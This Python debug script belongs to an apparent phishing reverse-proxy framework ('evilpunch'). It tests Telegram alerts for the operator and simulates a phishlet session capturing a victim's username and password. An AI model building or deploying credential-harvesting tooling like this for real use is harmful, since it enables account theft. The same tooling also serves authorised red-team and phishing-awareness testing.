#!/usr/bin/env python3
"""
Debug script to test the notification system and see what's happening
"""

import os
import sys
import django
from django.conf import settings

# Add the project directory to Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Set up Django
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'evilpunch.evilpunch.settings')
django.setup()

from core.models import Session, Phishlet, Proxy, ProxyDomain, NotificationSettings
from core.notify import notification_manager
import uuid

def test_notification_debug():
    """Debug the notification system"""
    
    print("🔍 Debugging Notification System...")
    
    # Check notification settings
    print("\n1. Checking Notification Settings:")
    settings = NotificationSettings.objects.filter(is_active=True).first()
    if settings:
        print(f"✅ Active settings found:")
        print(f"   - Bot Token: {settings.telegram_bot_token[:10]}...")
        print(f"   - Chat ID: {settings.telegram_chat_id}")
        print(f"   - Is Active: {settings.is_active}")
    else:
        print("❌ No active notification settings found!")
        return False
    
    # Test notification manager
    print("\n2. Testing Notification Manager:")
    try:
        print(f"✅ Notification manager initialized: {notification_manager}")
        print(f"   - Settings: {notification_manager.settings}")
        print(f"   - Message cache: {notification_manager.message_cache}")
    except Exception as e:
        print(f"❌ Error with notification manager: {e}")
        return False
    
    # Test direct notification
    print("\n3. Testing Direct Notification:")
    try:
        test_message = "🧪 Test notification from debug script"
        message_id = notification_manager.send_telegram_message(test_message)
        if message_id:
            print(f"✅ Test message sent successfully! Message ID: {message_id}")
        else:
            print("❌ Test message failed to send")
            return False
    except Exception as e:
        print(f"❌ Error sending test message: {e}")
        return False
    
    # Test session creation and credential capture
    print("\n4. Testing Session Credential Capture:")
    try:
        # Create test phishlet
        phishlet, created = Phishlet.objects.get_or_create(
            name="debug_test_phishlet",
            defaults={
                "data": {
                    "name": "Debug Test Phishlet",
                    "auth_urls": ["/login"],
                    "credentials": [
                        {"name": "username", "keyword": "username"},
                        {"name": "password", "keyword": "password"}
                    ]
                }
            }
        )
        
        # Create test session
        session = Session.objects.create(
            session_cookie=f"debug_session_{uuid.uuid4().hex[:16]}",
            phishlet=phishlet,
            proxy_domain="debug.example.com",
            visitor_ip="127.0.0.1",
            user_agent="Debug Test User Agent",
            is_active=True
        )
        
        print(f"✅ Created test session: {session.id}")
        print(f"   - Initial state: username='{session.captured_username}', password='{session.captured_password}'")
        
        # Test credential capture
        print("\n   🔍 Capturing username...")
        session.update_captured_data(captured_username="debuguser")
        print(f"   ✅ Username captured: '{session.captured_username}'")
        
        print("\n   🔍 Capturing password...")
        session.update_captured_data(captured_password="debugpass123")
        print(f"   ✅ Password captured: '{session.captured_password}'")
        
        print(f"\n   📊 Final session state:")
        print(f"      - Username: {session.captured_username}")
        print(f"      - Password: {session.captured_password}")
        print(f"      - Is Captured: {session.is_captured}")
        print(f"      - Telegram Message ID: {session.telegram_message_id}")
        
        # Clean up
        session.delete()
        if created:
            phishlet.delete()
        
        return True
        
    except Exception as e:
        print(f"❌ Error testing session capture: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    success = test_notification_debug()
    sys.exit(0 if success else 1)
